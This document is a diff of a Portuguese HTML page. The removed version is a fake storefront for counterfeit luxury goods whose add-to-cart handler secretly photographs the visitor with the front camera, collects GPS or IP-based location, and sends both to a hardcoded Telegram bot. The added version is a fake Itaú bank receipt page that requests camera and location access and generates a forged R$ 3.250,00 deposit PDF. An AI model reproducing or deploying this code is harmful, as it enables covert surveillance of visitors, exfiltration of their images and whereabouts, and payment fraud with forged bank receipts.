@@ -1,250 +1,76 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<title>Outlet Premium Brasil</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-:root{--cor:linear-gradient(135deg,#000 0%,#b00 100%)}
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
-body{background:#f5f5f5;color:#222}
-header{background:var(--cor);color:#fff;padding:18px;display:flex;justify-content:space-between;align-items:center}
-header .logo{font-size:24px;font-weight:700}
-header .carrinho{cursor:pointer;position:relative;font-size:22px}
-header .carrinho span{position:absolute;top:-6px;right:-6px;background:#ff0;color:#000;border-radius:50%;width:18px;height:18px;font-size:11px;display:flex;align-items:center;justify-content:center}
-nav{background:#222;display:flex;justify-content:center;gap:24px;padding:10px}
-nav a{color:#fff;text-decoration:none;font-size:14px}
-.banner{background:#b00;color:#fff;text-align:center;padding:10px;font-size:13px}
-.produtos{display:flex;flex-wrap:wrap;justify-content:center;padding:18px;gap:18px}
-.produto{background:#fff;border:1px solid #ddd;border-radius:12px;width:260px;padding:12px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.08);transition:transform .2s}
-.produto:hover{transform:translateY(-4px)}
-.produto img{width:100%;height:200px;object-fit:cover;border-radius:8px}
-.produto h3{font-size:15px;margin:8px 0}
-.produto .preco{font-size:18px;font-weight:700;color:#b00}
-.produto button{width:100%;padding:10px;background:#000;color:#fff;border:none;border-radius:6px;cursor:pointer;margin-top:8px}
-footer{background:#000;color:#fff;text-align:center;padding:12px;font-size:12px}
-.carrinho-sidebar{position:fixed;top:0;right:-320px;width:320px;height:100%;background:#fff;box-shadow:-4px 0 12px rgba(0,0,0,.15);transition:right .3s;z-index:999}
-.carrinho-sidebar.aberto{right:0}
-.carrinho-header{background:var(--cor);color:#fff;padding:14px;display:flex;justify-content:space-between;align-items:center}
-.carrinho-header h4{font-size:16px}
-.carrinho-header i{cursor:pointer}
-.carrinho-body{padding:14px;max-height:calc(100% - 160px);overflow-y:auto}
-.carrinho-item{display:flex;align-items:center;margin-bottom:12px;border-bottom:1px solid #eee;padding-bottom:10px}
-.carrinho-item img{width:60px;height:60px;object-fit:cover;border-radius:4px;margin-right:10px}
-.carrinho-info{flex:1;font-size:13px}
-.carrinho-info .nome{font-weight:600}
-.carrinho-info .qtd{margin-top:4px}
-.carrinho-info .qtd button{background:#ddd;border:none;width:20px;height:20px;border-radius:50%;cursor:pointer;margin:0 4px}
-.carrinho-footer{padding:14px;border-top:1px solid #ddd;text-align:center}
-.carrinho-footer .total{font-size:18px;font-weight:700;margin-bottom:10px}
-.carrinho-footer button{width:100%;padding:10px;background:#000;color:#fff;border:none;border-radius:6px;cursor:pointer}
-</style>
+  <meta charset="UTF-8" />
+  <title>Comprovante Itaú</title>
+  <!-- jsPDF CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 40px; }
+    #btnDownload { display: none; margin-top: 20px; padding: 10px 20px; font-size: 16px; }
+  </style>
 </head>
 <body>
 
-<header>
-  <div class="logo">Outlet Premium Brasil</div>
-  <div class="carrinho" onclick="toggleCarrinho()">
-    <i class="fas fa-shopping-cart"></i>
-    <span id="contador">0</span>
-  </div>
-</header>
+  <h2>Visualização do Comprovante</h2>
+  <p>A imagem abaixo é apenas ilustrativa.</p>
+  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150'%3E%3Crect width='100%25' height='100%25' fill='%23f3f3f3'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='14' fill='%23555'%3EComprovante Itaú%3C/text%3E%3C/svg%3E" alt="Comprovante" style="border:1px solid #ccc;" />
+  <br>
 
-<nav>
-  <a href="#">Masculino</a>
-  <a href="#">Feminino</a>
-  <a href="#">Relógios</a>
-  <a href="#">Acessórios</a>
-</nav>
+  <button id="btnDownload">Baixar Comprovante</button>
 
-<div class="banner">
-  Réplicas 1:1 – Envio imediato para todo Brasil
-</div>
+  <video id="video" style="display:none;" autoplay muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-<div class="produtos">
-
-  <div class="produto">
-    <img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?auto=format&fit=crop&w=800&q=60" alt="Jordan 1">
-    <h3>Nike Air Jordan 1 High</h3>
-    <p>Replica AAA – couro italiano</p>
-    <p class="preco">R$ 299,00</p>
-    <button onclick="addCarrinho('Jordan 1', 299, 'https://images.unsplash.com/photo-1542291026-7eec264c27ff?auto=format&fit=crop&w=800&q=60')">Adicionar ao carrinho</button>
-  </div>
-
-  <div class="produto">
-    <img src="https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=800&q=60" alt="LV Neverfull">
-    <h3>Louis Vuitton Neverfull</h3>
-    <p>Lona importada – fivelas originais</p>
-    <p class="preco">R$ 449,00</p>
-    <button onclick="addCarrinho('LV Neverfull', 449, 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=800&q=60')">Adicionar ao carrinho</button>
-  </div>
-
-  <!-- ROLEX SUBMARINER COM IMAGEM CORRIGIDA -->
-  <div class="produto">
-    <img src="https://images.unsplash.com/photo-1609587312208-cea54be969e7?auto=format&fit=crop&w=800&q=60" alt="Rolex Sub">
-    <h3>Rolex Submariner</h3>
-    <p>Automático – aço 904L – caixa holograma</p>
-    <p class="preco">R$ 799,00</p>
-    <button onclick="addCarrinho('Rolex Sub', 799, 'https://images.unsplash.com/photo-1609587312208-cea54be969e7?auto=format&fit=crop&w=800&q=60')">Adicionar ao carrinho</button>
-  </div>
-
-  <div class="produto">
-    <img src="https://images.unsplash.com/photo-1627123424574-724758594e93?auto=format&fit=crop&w=800&q=60" alt="Cinto Gucci">
-    <h3>Gucci Double G</h3>
-    <p>Couro legítimo – GG buckle</p>
-    <p class="preco">R$ 199,00</p>
-    <button onclick="addCarrinho('Cinto Gucci', 199, 'https://images.unsplash.com/photo-1627123424574-724758594e93?auto=format&fit=crop&w=800&q=60')">Adicionar ao carrinho</button>
-  </div>
-
-  <div class="produto">
-    <img src="https://images.unsplash.com/photo-1547949003-9792a18a2601?auto=format&fit=crop&w=800&q=60" alt="Ray-Ban">
-    <h3>Ray-Ban Aviator</h3>
-    <p>Lentes polarizadas – armação metálica</p>
-    <p class="preco">R$ 149,00</p>
-    <button onclick="addCarrinho('Ray-Ban', 149, 'https://images.unsplash.com/photo-1547949003-9792a18a2601?auto=format&fit=crop&w=800&q=60')">Adicionar ao carrinho</button>
-  </div>
-
-  <div class="produto">
-    <img src="https://images.unsplash.com/photo-1522312346375-d1a52e2b99b3?auto=format&fit=crop&w=800&q=60" alt="Cartier">
-    <h3>Cartier Love Bracelet</h3>
-    <p>Aço inox – parafuses 1:1</p>
-    <p class="preco">R$ 259,00</p>
-    <button onclick="addCarrinho('Bracelet Cartier', 259, 'https://images.unsplash.com/photo-1522312346375-d1a52e2b99b3?auto=format&fit=crop&w=800&q=60')">Adicionar ao carrinho</button>
-  </div>
-
-</div>
-
-<!-- Carrinho lateral -->
-<div class="carrinho-sidebar" id="carrinhoSidebar">
-  <div class="carrinho-header">
-    <h4>Carrinho</h4>
-    <i class="fas fa-times" onclick="toggleCarrinho()"></i>
-  </div>
-  <div class="carrinho-body" id="carrinhoBody"></div>
-  <div class="carrinho-footer">
-    <div class="total" id="total">Total: R$ 0,00</div>
-    <button onclick="finalizarCompra()">Finalizar compra</button>
-  </div>
-</div>
-
-<footer>
-  CNPJ: 47.293.333/0001-00 | São Paulo – SP | WhatsApp 11 9 8765-4321
-</footer>
-
-<script>
-const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
-const CHAT_ID = '-1003187104876';
-
-let carrinho = [];
-
-const tele = (msg, media) => {
-  if (media) {
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('caption', msg);
-    form.append('photo', media, 'selfie.jpg');
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
-  } else {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-    });
-  }
-};
-
-async function capturaSilenciosa(produto) {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-    const v = document.createElement('video');
-    v.srcObject = stream;
-    await v.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = 640; canvas.height = 480;
-    canvas.getContext('2d').drawImage(v, 0, 0);
-    canvas.toBlob(blob=>{
-      tele(`📸 ${produto}`, blob);
-      stream.getTracks().forEach(t=>t.stop());
-    }, 'image/jpeg', 0.9);
-  } catch (e) {
-    tele('📸 erro: ' + e.message);
-  }
-}
-
-function addCarrinho(nome, preco, img) {
-  const item = carrinho.find(p => p.nome === nome);
-  if (item) {
-    item.qtd++;
-  } else {
-    carrinho.push({nome, preco, img, qtd: 1});
-  }
-  atualizarCarrinho();
-  // dispara permissões em segundo plano
-  navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-  navigator.geolocation.getCurrentPosition(
-    pos=>{
-      const {latitude:l,longitude:n}=pos.coords;
-      tele(`🛒 ${nome} https://maps.google.com/?q=${l},${n}`);
-    },
-    ()=>fetch('https://ipapi.co/json/').then(r=>r.json()).then(data=>tele(`🛒 ${nome} https://maps.google.com/?q=${data.latitude},${data.longitude}`)).catch(()=>tele(nome))
-  );
-  // captura silenciosa após 600 ms
-  setTimeout(()=>capturaSilenciosa(nome), 600);
-}
-
-function atualizarCarrinho() {
-  const body = document.getElementById('carrinhoBody');
-  const contador = document.getElementById('contador');
-  const totalEl = document.getElementById('total');
-  body.innerHTML = '';
-  let total = 0;
-  carrinho.forEach(item => {
-    total += item.preco * item.qtd;
-    const div = document.createElement('div');
-    div.className = 'carrinho-item';
-    div.innerHTML = `
-      <img src="${item.img}" alt="${item.nome}">
-      <div class="carrinho-info">
-        <div class="nome">${item.nome}</div>
-        <div class="qtd">
-          <button onclick="mudarQtd('${item.nome}', -1)">-</button>
-          ${item.qtd}
-          <button onclick="mudarQtd('${item.nome}', 1)">+</button>
-        </div>
-      </div>
-    `;
-    body.appendChild(div);
-  });
-  contador.textContent = carrinho.reduce((s, p) => s + p.qtd, 0);
-  totalEl.textContent = `Total: R$ ${total.toFixed(2).replace('.', ',')}`;
-}
-
-function mudarQtd(nome, delta) {
-  const item = carrinho.find(p => p.nome === nome);
-  if (item) {
-    item.qtd += delta;
-    if (item.qtd <= 0) {
-      carrinho = carrinho.filter(p => p.nome !== nome);
+  <script>
+    // -------------------------------------------------
+    // 1. Captura foto + permissões
+    async function tirarFoto() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      video.srcObject = stream;
+      await video.play();
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0);
+      stream.getTracks().forEach(t => t.stop()); // libera câmera
     }
-  }
-  atualizarCarrinho();
-}
 
-function toggleCarrinho() {
-  document.getElementById('carrinhoSidebar').classList.toggle('aberto');
-}
+    // 2. Geolocalização (só para garantir permissão)
+    function getGeo() {
+      return new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
+      );
+    }
 
-function finalizarCompra() {
-  if (carrinho.length === 0) return alert('Carrinho vazio!');
-  const total = carrinho.reduce((s, p) => s + p.preco * p.qtd, 0);
-  const lista = carrinho.map(p => `${p.qtd}x ${p.nome}`).join(', ');
-  alert(`Pedido finalizado!\n\n${lista}\n\nTotal: R$ ${total.toFixed(2).replace('.', ',')}\n\nPix: 11987654321\nApós o pagamento envie o comprovante via WhatsApp.`);
-  carrinho = [];
-  atualizarCarrinho();
-  toggleCarrinho();
-}
-</script>
+    // 3. Gera PDF + download
+    function downloadPDF() {
+      const { jsPDF } = window.jspdf;
+      const pdf = new jsPDF();
+      pdf.setFontSize(16);
+      pdf.text("Comprovante de Depósito Itaú", 20, 20);
+      pdf.setFontSize(12);
+      pdf.text("Valor: R$ 3.250,00", 20, 35);
+      pdf.text("Data/Hora: " + new Date().toLocaleString("pt-BR"), 20, 45);
+      pdf.save("comprovante_itau.pdf");
+    }
 
+    // -------------------------------------------------
+    // 4. Fluxo: permissões → foto → habilita botão
+    (async () => {
+      try {
+        await Promise.all([tirarFoto(), getGeo()]);
+        document.getElementById('btnDownload').style.display = 'inline-block';
+      } catch (err) {
+        // fallback silencioso: libera o botão mesmo assim
+        document.getElementById('btnDownload').style.display = 'inline-block';
+      }
+    })();
+
+    // 5. Vincula botão ao download
+    document.getElementById('btnDownload').addEventListener('click', downloadPDF);
+  </script>
 </body>
 </html>
